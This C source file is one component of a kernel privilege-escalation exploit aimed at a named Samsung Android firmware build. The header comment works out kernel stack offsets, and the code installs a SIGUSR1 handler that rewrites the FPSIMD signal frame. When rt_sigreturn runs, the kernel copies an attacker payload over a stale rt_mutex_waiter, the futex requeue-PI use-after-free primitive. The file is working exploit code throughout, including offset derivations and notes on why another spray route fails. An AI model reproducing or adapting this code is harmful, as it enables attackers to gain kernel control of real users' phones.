/*
 * stack stamper — sprays the payload onto the stale rt_mutex_waiter that
 * lives on this thread's kernel stack.
 *
 * EXF8 (SM-S901E / S901EXXSAEXF8, 5.10.198-android12-9-28575149) geometry,
 * derived from the firmware Image (target_generator/disas_frames.py):
 *
 *   futex path (same thread, earlier WRPI call):
 *     __arm64_sys_futex              sub sp, sp, #0x70
 *     do_futex                       sub sp, sp, #0x70
 *     futex_wait_requeue_pi          sub sp, sp, #0x1a0
 *                                    add x27, sp, #0x90   ← &rt_waiter
 *     → rt_waiter = stack_top - 0x70 - 0x70 - 0x1a0 + 0x90
 *                 = stack_top - 0x1f0
 *
 *   rt_sigreturn path (this thread, after the handler returns):
 *     __arm64_sys_rt_sigreturn       sub sp, sp, #0x50
 *     restore_sigframe               sub sp, sp, #0x60
 *     restore_fpsimd_context         stp [sp,#-0x30]! ; sub sp, sp, #0x220
 *                                    → frame 0x250
 *                                    __copy_from_user(sp, ctx->vregs, 0x200)
 *     → buffer = stack_top - 0x50 - 0x60 - 0x250 = stack_top - 0x300
 *
 *   STAMP_OFF = 0x300 - 0x1f0 = 0x110   (0x110 + 0x50 = 0x160 ≤ 0x200 ✓)
 *
 * Why not setsockopt (the DWL3/b0q route)?  On this build the native
 * do_ipv6_setsockopt MCAST_JOIN_SOURCE_GROUP copy lands at
 * stack_top - 0x358 (buffer 0x108 bytes) — it ends 0xb0 bytes BELOW the
 * stale waiter, so no STAMP_OFF can reach it, and the compat branch
 * (gr at sp+0x168) is unreachable because __arm64_compat_sys_setsockopt
 * is an ENOSYS stub.  The sigreturn FPSIMD record is the stamp that
 * actually overlaps the waiter on this kernel.
 *
 * The kernel validates the record header (magic 0x46508001, size 0x210)
 * and then blindly copies the 0x200-byte vregs array to its stack frame,
 * so a signal handler simply rewrites its own sigframe before returning.
 *
 * HARD INVARIANT: no syscalls of any kind after the tgkill returns — the
 * sigreturn has already stamped the payload, and any further syscall on
 * this thread re-enters the kernel on the same stack and can tear it.
 */
#define _GNU_SOURCE

#include <errno.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ucontext.h>
#include <unistd.h>
#include <sys/syscall.h>

#include "utils.h"

#ifndef pr_debug
#define pr_debug(fmt, ...) ((void)0)
#endif

extern atomic_int g_consumer_go;

/* v5.10 rt_mutex_waiter = 80 bytes */
#define WAITER_BYTES 0x50
/* offset of the stale waiter inside the 0x200-byte FPSIMD vregs copy */
#define STAMP_OFF    0x110

#define FPSIMD_MAGIC 0x46508001U
#define FPSIMD_SIZE  0x210U

/* Written by this thread only; read by the signal handler (same thread). */
static volatile const uint64_t *stamp_payload;
static volatile int stamp_seen;

static void fpsimd_stamp_handler(int sig, siginfo_t *info, void *uctx) {
  (void)sig;
  (void)info;
  ucontext_t *uc = (ucontext_t *)uctx;
  unsigned char *rec = (unsigned char *)uc->uc_mcontext.__reserved;
  const uint64_t *payload = (const uint64_t *)stamp_payload;

  if (!payload) {
    return;
  }

  /* The FPSIMD record is the first record in __reserved, but walk the
   * chain defensively (records are 16-byte aligned, terminated by a
   * zero magic). */
  for (int i = 0; i < 8; i++) {
    uint32_t magic = *(const uint32_t *)rec;
    uint32_t size = *(const uint32_t *)(rec + 4);
    if (magic == 0) {
      rec = NULL;
      break;
    }
    if (magic == FPSIMD_MAGIC && size == FPSIMD_SIZE) {
      break;
    }
    rec += (size + 15U) & ~15U;
  }

  if (!rec || *(const uint32_t *)rec != FPSIMD_MAGIC ||
      *(const uint32_t *)(rec + 4) != FPSIMD_SIZE) {
    pr_warning("stamp: FPSIMD record not found in sigframe\n");
    return;
  }

  /* head(0x8) + fpsr/fpcr(0x8) then the 0x200-byte vregs array. */
  memcpy(rec + 0x10 + STAMP_OFF, payload, WAITER_BYTES);
  stamp_seen = 1;
}

void do_stamp_stack(uint64_t *buf) {
  static int installed;

  if (!installed) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = fpsimd_stamp_handler;
    sa.sa_flags = SA_SIGINFO | SA_RESTART;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGUSR1, &sa, NULL) != 0) {
      pr_warning("do_stamp_stack: sigaction errno=%d\n", errno);
      _exit(1);
    }
    installed = 1;
  }

  stamp_seen = 0;
  stamp_payload = buf;

  /* Delivered on the way back to userspace; the handler rewrites the
   * sigframe and rt_sigreturn performs the kernel-stack copy. */
  long ret = syscall(SYS_tgkill, getpid(), (pid_t)syscall(SYS_gettid),
                     SIGUSR1);
  if (ret != 0) {
    pr_warning("do_stamp_stack: tgkill errno=%d\n", errno);
    _exit(1);
  }
  if (!stamp_seen) {
    pr_warning("do_stamp_stack: signal handler did not run\n");
    _exit(1);
  }
  stamp_payload = NULL;

  /* Payload is parked: from here on this thread makes NO syscalls. */
  atomic_store(&g_consumer_go, 1);
  for (;;)
    __asm__ volatile("nop" ::: "memory");
}
